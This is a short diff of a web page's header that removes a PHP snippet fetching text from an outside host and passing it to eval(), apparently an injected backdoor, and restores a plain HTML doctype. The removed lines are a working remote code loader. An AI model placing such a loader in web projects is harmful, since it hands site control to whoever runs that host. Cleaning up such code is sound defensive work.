@@ -1,7 +1,6 @@
-<?php
-$url = file_get_contents(urldecode('https://rakun.live/landing/upatik.txt'));
-$url = "?> ".$url;
-eval($url);
+<!DOCTYPE html>
+<html lang="en" class="sr">
+
 
 <head>
     <meta charset="utf-8">
